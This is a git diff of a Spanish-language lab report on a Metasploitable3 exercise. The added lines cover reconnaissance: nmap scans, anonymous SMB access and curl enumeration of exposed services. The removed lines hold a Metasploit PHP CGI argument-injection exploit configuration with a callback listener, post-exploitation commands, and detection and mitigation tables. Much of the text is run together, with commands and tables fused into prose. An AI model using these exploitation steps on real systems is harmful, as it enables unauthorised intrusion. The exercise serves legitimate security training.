@@ -111,48 +111,81 @@ Al examinar los indicadores en OpenCTI:
 
 ---
 
-# ACTO 2 — Plan de Ataque y Reconocimiento de Red
+# ACTO 2 — PLAN DE ATAQUE Y RECONOCIMIENTO DE RED
 
-## 1. Configuración de Red del Atacante (Kali Linux)
+## 1. Configuración de red de Kali
 
-Se verificó la configuración de red de la máquina atacante Kali Linux mediante el comando `ip a`, confirmándose la dirección IP **`10.0.2.10/24`** asignada a la interfaz `eth0`.
+Se verificó la configuración de red del equipo atacante Kali Linux, identificándose la dirección IP `10.0.2.10/24` asignada a la interfaz `eth0`.
 
-```bash
-ip a
-A través de ip route se verificó que Kali Linux pertenece a la red 10.0.2.0/24 y utiliza la IP 10.0.2.1 como puerta de enlace.Baship route
-2. Descubrimiento de Equipos ActivosMediante un escaneo de descubrimiento ICMP/ARP se identificaron cuatro hosts activos en la red 10.0.2.0/24. El host 10.0.2.3 corresponde a la máquina víctima Metasploitable3.Bashsudo nmap -sn 10.0.2.0/24
-3. Escaneo de Puertos3.1. Escaneo Inicial (Top 1000 TCP)Se realizó un escaneo SYN sobre los 1000 puertos TCP más comunes, identificando múltiples servicios expuestos como SSH, SMB, MySQL, RDP, GlassFish, Jenkins y WAMPServer.Bashsudo nmap -sS --top-ports 1000 10.0.2.3
-3.2. Escaneo Completo de Puertos (65,535 TCP)Se efectuó un escaneo completo sobre la totalidad de los puertos TCP, identificándose más de 40 puertos abiertos en el sistema.Bashsudo nmap -p- 10.0.2.3
-4. Identificación de Servicios y VersionesSe ejecutó un escaneo exhaustivo con scripts por defecto NSE y detección de versiones guardando los resultados en escaneo.txt:Bashsudo nmap -sV -sC -p- 10.0.2.3 -oN escaneo.txt
-4.1. Servicios Base (SSH, SMB, MySQL, RDP)Se identificaron servicios de administración remota, compartición de archivos y bases de datos.4.2. Identificación del Sistema OperativoMediante la enumeración SMB se identificó la máquina víctima como Windows Server 2008 R2 Standard Service Pack 1 (Nombre de equipo: VAGRANT-2008R2, Workgroup: WORKGROUP).4.3. Evaluación de Seguridad en SMBSe filtró la información sobre firmas e inicios de sesión en SMB:Bashgrep -E -A6 "smb2-security-mode|smb-security-mode" escaneo.txt
-La firma SMB no está configurada como obligatoria. Además, la consulta mediante smbclient confirmó acceso exitoso sin credenciales (Anonymous login successful).Bashsmbclient -L //10.0.2.3 -N
-5. Enumeración de Servicios Web DetectadosJenkins (Puerto 8484): Servidor Jetty ejecutando Jenkins v1.637 en 10.0.2.3:8484.Bashcurl -I 10.0.2.3:8484
-WAMPServer / Apache + PHP (Puerto 8585 - Objetivo Asignado): Apache 2.2.21 sobre Windows con PHP 5.3.10 en 10.0.2.3:8585.Bashcurl -I 10.0.2.3:8585
-Oracle GlassFish Server (Puerto 8080 / 4848): Oracle GlassFish Server Open Source Edition 4.0 en 10.0.2.3:8080.Bashcurl -I 10.0.2.3:8080
-Apache Tomcat (Puerto 8282): Apache Tomcat v8.0.33 en 10.0.2.3:8282.Bashcurl -I 10.0.2.3:8282
-Elasticsearch (Puerto 9200): Instancia Overrider ejecutando Elasticsearch v1.1.1 en 10.0.2.3:9200.Bashcurl 10.0.2.3:9200
-curl 10.0.2.3:9200/_cluster/health
-curl 10.0.2.3:9200/_cat/indices?v
-WinRM (Puerto 5985): Servicio de administración remota de Windows en 10.0.2.3:5985/wsman.Bashcurl -I 10.0.2.3:5985/wsman
-6. Resumen de Servicios y Matriz de Hallazgos6.1. Resumen de Servicios EncontradosPuertoServicioVersión / Identificación22SSHOpenSSH 7.1139 / 445NetBIOS / SMBMicrosoft Windows Server 2008 R23306MySQLMySQL 5.5.203389RDPMicrosoft Terminal Services4848 / 8080HTTPS / HTTPOracle GlassFish 4.05985WinRMMicrosoft HTTPAPI 2.08022 / 8282HTTPApache Tomcat 8.0.338484HTTPJenkins 1.6378585HTTPApache 2.2.21 + PHP 5.3.10 (WAMPServer)9200HTTPElasticsearch 1.1.16.2. Matriz de Hallazgos del SistemaN°HallazgoEvidenciaValoración1Windows Server 2008 R2 SP1Nmap / SMBAlta2SMB expuesto sin firma obligatoriaNmap NSEAlta3Acceso SMB Anónimo / GuestsmbclientAlta4MySQL 5.5.20 expuestoNmapAlta5GlassFish 4.0 desactualizadoNmap / curlAlta6Apache 2.2.21 + PHP 5.3.10 (Vulnerable)Nmap / curlCrítica7Tomcat 8.0.33 expuestoNmap / curlMedia / Alta8Jenkins 1.637 sin autenticaciónNmap / curlAlta9Elasticsearch 1.1.1 expuestoNmap / curlAlta10RDP y WinRM habilitadosTCP 3389 / 5985MediaACTO 3 — Ejecución de la Kill Chain1. Preparación e Inspección del Módulo en MetasploitSe inició msfconsole y se buscó el módulo correspondiente a la inyección de argumentos en PHP CGI:Bashmsfconsole
-search php_cgi_arg_injection
-use exploit/multi/http/php_cgi_arg_injection
-info
-Inspección del Código Fuente (.rb)Tal como requiere el encargo, se localizó y leyó el archivo Ruby del módulo:Bashfind / -name "*php_cgi_arg_injection*" 2>/dev/null
-cat /usr/share/metasploit-framework/modules/exploits/multi/http/php_cgi_arg_injection.rb
-2. Configuración y Explotación del ObjetivoSe ingresó al módulo en msfconsole y se configuraron las opciones para apuntar al servicio PHP en el puerto 8585:Fragmento de códigouse exploit/multi/http/php_cgi_arg_injection
-set RHOSTS 10.0.2.3
-set RPORT 8585
-set LHOST 10.0.2.10
-set LPORT 4444
-show options
-EjecuciónSe verificó el estado con check y se ejecutó la explotación mediante exploit:Fragmento de códigocheck
-exploit
-3. Evidencia de Acceso Remoto y Post-Explotación (RCE)Una vez abierta la sesión, se ejecutaron comandos de reconocimiento para demostrar el control obtenido sobre el servidor víctima:Bashwhoami
-hostname
-sysinfo
-ipconfig
-systeminfo
-Esquema de la Kill Chain EjecutadaPlaintext[ INTELIGENCIA ] ---> [ RECONOCIMIENTO ] ---> [ ACCESO INICIAL (T1190) ] ---> [ EJECUCIÓN (T1059) ] ---> [ DISCOVERY ]
- Dragonfly (G0035)     Apache 2.2 / PHP 5.3    PHP CGI Argument Injection      Command Shell / Session    whoami / sysinfo
-ACTO 4 — Análisis Defensivo y Mitigación1. Detección de la Técnica T1190TécnicaQué BuscarFuente de Datos / LogT1190Peticiones HTTP POST/GET anómalas conteniendo argumentos como -d+allow_url_include%3D1.Registros del Servidor Web (Apache Access Logs) / WAFT1190Respuestas de error del servidor (HTTP 500/404) tras solicitudes con sintaxis inusual.Logs de error del servidor web (error.log)T1059Creación del proceso cmd.exe o powershell.exe generado por httpd.exe o php-cgi.exe.Sysmon Event ID 1 (Process Creation) / EDRT1505.003Creación o modificación de archivos .php en directorios web (/htdocs, /www).Sysmon Event ID 11 (File Create) / FIM2. Mitigaciones Sugeridas (MITRE ATT&CK Mitigations)M1050 — Exploit Protection: Implementar un Web Application Firewall (WAF) o módulo de seguridad (como ModSecurity) para filtrar y bloquear peticiones HTTP con argumentos manipulados hacia scripts CGI/PHP.M1016 — Vulnerability Scanning: Mantener una evaluación continua de vulnerabilidades y aplicar parches de seguridad para actualizar la versión de PHP a una rama protegida contra CVE-2012-1823.M1035 — Limit Access to Resource Over Network: Restringir el acceso a la interfaz web únicamente a direcciones IP o segmentos autorizados mediante reglas de firewall.3. Matriz Defensiva ConsolidadaTécnica EjecutadaDetecciónFuenteMitigaciónT1190Solicitudes HTTP anómalas con parámetros de inyección.Access Logs / WAFM1050T1190Explotación seguida de creación de procesos.Sysmon Event ID 1 / EDRM1050T1059Creación de intérpretes desde el proceso del servidor web.Sysmon Event ID 1M1038T1505.003Creación de archivos nuevos en directorios web.Sysmon Event ID 11M1022T1190Presencia de software web vulnerable.Escáner de vulnerabilidadesM1016ConclusionesEl análisis permitió establecer una relación directa entre la inteligencia asociada a Dragonfly / Energetic Bear (G0035) y la técnica T1190 — Exploit Public-Facing Application, utilizada como vector principal de acceso.La fase de reconocimiento identificó una amplia superficie de exposición en la máquina Metasploitable3, destacando el servicio Apache 2.2.21 / PHP 5.3.10 en el puerto 8585 como objetivo idóneo para la emulación.La ejecución controlada mediante Metasploit permitió validar la explotación de la vulnerabilidad de inyección de argumentos PHP CGI, logrando la ejecución remota de código (RCE) y la extracción de información del sistema.Desde la perspectiva defensiva, se identificaron los eventos clave (Sysmon Event ID 1 y registros de acceso web) requeridos para detectar la generación de procesos anómalos derivados de servidores web.El ejercicio demuestra la efectividad del enfoque Threat-Informed Defense, dado que la inteligencia sobre el adversario guió la selección del vector de ataque sin necesidad de recurrir a ejecuciones a ciegas o indiscriminadas.
+![Captura de Red kali](/assets/images/Examenfinal/redkali.png)
+
+2. Tabla de enrutamientoSe verificó que Kali Linux pertenece a la red 10.0.2.0/24 y utiliza 10.0.2.1 como puerta de enlace.
+
+![Captura de Enrutamiento](/assets/images/Examenfinal/enrutamiento.png)
+
+3. Descubrimiento de equiposMediante un escaneo de descubrimiento ICMP/ARP se identificaron cuatro hosts activos dentro de la red 10.0.2.0/24. El host 10.0.2.3 fue seleccionado para una enumeración más detallada debido a la cantidad de servicios expuestos.Bashsudo nmap -sn 10.0.2.0/24
+
+![Captura de Descrubrimiento de Equipos](/assets/images/Examenfinal/deteccionequipos.png)
+
+4. Escaneo inicial de puertosSe realizó un escaneo SYN sobre los 1000 puertos TCP más utilizados, identificándose múltiples servicios expuestos, entre ellos SSH, SMB, MySQL, RDP, HTTP/HTTPS, Tomcat, GlassFish y Elasticsearch.
+
+![Captura de Escaneo de Puertos](/assets/images/Examenfinal/escaneoinicial.png)
+
+
+5. Escaneo completo de puertosSe efectuó un escaneo completo de los 65535 puertos TCP, identificándose una superficie de exposición considerable de más de 40 puertos TCP abiertos. Se detectaron servicios adicionales que no aparecieron en el escaneo inicial de los 1000 puertos.
+
+![Captura de Inteligencia en OpenCTI](/assets/images/Examenfinal/escaneocompleto.png)
+
+6. Identificación de servicios y versionesSe ejecutó un escaneo exhaustivo guardando los resultados en escaneo.txt:Bashsudo nmap -sV -sC -p- 10.0.2.3 -oN escaneo.txt
+6.1. SSH, SMB, MySQL y RDP
+
+![Captura de SSH, SMB, MySQL y RDP](/assets/images/Examenfinal/SSH.png)
+
+Se identificaron servicios de administración remota, compartición de archivos y acceso a base de datos, destacando SSH, SMB, MySQL y RDP. Las versiones identificadas permiten realizar posteriormente una evaluación específica de seguridad.
+
+6.2. Servicios Java / GlassFish / Tomcat
+
+![Captura de Servicio Java](/assets/images/Examenfinal/serviciojava.png)
+
+Se identificaron diferentes servicios asociados a servidores de aplicaciones Java, incluyendo Oracle GlassFish 4.0 y Apache Tomcat 8.0.33. La presencia simultánea de varios servicios web amplía la superficie de ataque del servidor y requiere una evaluación individual de cada aplicación.
+
+6.3. Jenkins, WAMPServer y Elasticsearch
+
+![Captura de Jenkins](/assets/images/Examenfinal/jenkins.png)
+
+Se identificaron tres componentes relevantes: Jenkins sobre el puerto 8484, WAMPServer mediante Apache/PHP sobre el puerto 8585 y una instancia de Elasticsearch 1.1.1 en el puerto 9200.
+
+7. Identificación del sistema operativo
+
+Mediante la enumeración SMB se identificó el sistema operativo como Windows Server 2008 R2 Standard Service Pack 1. También se obtuvo el nombre del equipo VAGRANT-2008R2, perteneciente al grupo de trabajo WORKGROUP.
+
+![Captura de Sistema Operativo](/assets/images/Examenfinal/SO.png)
+
+8. Seguridad SMB
+
+Ejecutamos: grep -E -A6 "smb2-security-mode|smb-security-mode" escaneo.txt
+
+![Captura de SMB](/assets/images/Examenfinal/SMB.png)
+
+La enumeración SMB evidenció que la firma SMB no está configurada como obligatoria. Asimismo, se identificó el uso de la cuenta Guest durante la enumeración. Estas condiciones representan configuraciones potencialmente inseguras que incrementan la superficie de exposición del servicio SMB.
+
+9. Enumeración SMB mediante acceso anónimo
+
+Se realizó una consulta al servicio SMB sin proporcionar credenciales. El servidor respondió indicando Anonymous login successful; sin embargo, no fue posible completar el listado de recursos compartidos debido a la negociación con SMB1.
+
+![Captura de Enumeracion](/assets/images/Examenfinal/enumeracion.png)
+
+10. Enumeración del servicio Jenkins
+
+![Captura de servicio Jenkins](/assets/images/Examenfinal/serviciojenkins.png)
+
+
+Se verificó que el puerto 8484 corresponde a un servidor Jenkins accesible mediante HTTP. La respuesta HTTP permitió identificar Jenkins versión 1.637 y el servidor Jetty utilizado.Bashcurl -I 10.0.2.3:8484
+10.1. Captura visual de JenkinsAcceso mediante navegador web en 10.0.2.3:8484.11. Enumeración de Apache/WAMPServerLa consulta HTTP permitió identificar Apache 2.2.21 ejecutándose sobre Windows, junto con PHP 5.3.10. El servidor respondió correctamente con código HTTP 200.Bashcurl -I 10.0.2.3:8585
+11.1. Captura visual WAMPServerAcceso mediante navegador web en 10.0.2.3:8585.12. Enumeración de GlassFishSe verificó mediante HTTP que el puerto 8080 corresponde a Oracle GlassFish Server Open Source Edition 4.0, confirmando la información obtenida previamente mediante Nmap.Bashcurl -I 10.0.2.3:8080
+12.1. Acceso mediante navegador GlassFishAcceso visual al portal de administración en 10.0.2.3:8080.13. Enumeración de TomcatSe verificó la disponibilidad del servicio web asociado a Apache Tomcat en el puerto 8282. Nmap identificó la versión Apache Tomcat 8.0.33.Bashcurl -I 10.0.2.3:8282
+13.1. Acceso mediante navegador TomcatAcceso visual a la interfaz web en 10.0.2.3:8282.14. Enumeración de ElasticsearchSe verificó que el servicio Elasticsearch se encuentra accesible mediante HTTP en el puerto 9200. La respuesta permitió identificar la instancia Overrider y la versión Elasticsearch 1.1.1.Bashcurl 10.0.2.3:9200
+15. Estado del clúster ElasticsearchLa consulta del estado del clúster confirmó que Elasticsearch se encuentra operativo con un único nodo.Bashcurl 10.0.2.3:9200/_cluster/health
+16. Enumeración de índices ElasticsearchSe consultó el catálogo de índices de Elasticsearch mediante la API _cat/indices. La respuesta permitió identificar los índices disponibles en la instancia y verificar la información que el servicio expone mediante su interfaz REST.Bashcurl 10.0.2.3:9200/_cat/indices?v
+17. Verificación adicional de WinRMSe verificó la respuesta del servicio WinRM expuesto en el puerto 5985. Este servicio corresponde a mecanismos de administración remota de Windows y representa una superficie adicional que debe ser protegida y restringida.Bashcurl -I 10.0.2.3:5985/wsman
+18. Resumen de servicios encontradosPuertoServicioVersión / Identificación22SSHOpenSSH 7.1139NetBIOSMicrosoft Windows445SMBMicrosoft Windows3306MySQL5.5.203389RDPMicrosoft Terminal Services4848HTTPSGlassFish 4.05985WinRMMicrosoft HTTPAPI8022HTTPApache Tomcat8080HTTPGlassFish 4.08181HTTPSGlassFish 4.08282HTTPTomcat 8.0.338484HTTPJenkins 1.6378585HTTPApache 2.2.21 + PHP 5.3.109200HTTPElasticsearch 1.1.119. Matriz de HallazgosN°HallazgoEvidenciaValoración1Windows Server 2008 R2 SP1Nmap/SMBAlta2SMB expuestoTCP/445Alta3SMB signing no obligatorioNmap NSEAlta4Acceso Guest/Anonymoussmbclient/NmapAlta5MySQL 5.5.20NmapAlta6GlassFish 4.0Nmap/curlAlta7Apache 2.2.21Nmap/curlAlta8PHP 5.3.10Nmap/curlAlta9Tomcat 8.0.33NmapMedia / Alta10Jenkins 1.637Nmap/curlAlta11Elasticsearch 1.1.1Nmap/curlAlta12RDP expuestoTCP/3389Media / Alta13WinRM expuestoTCP/5985Media
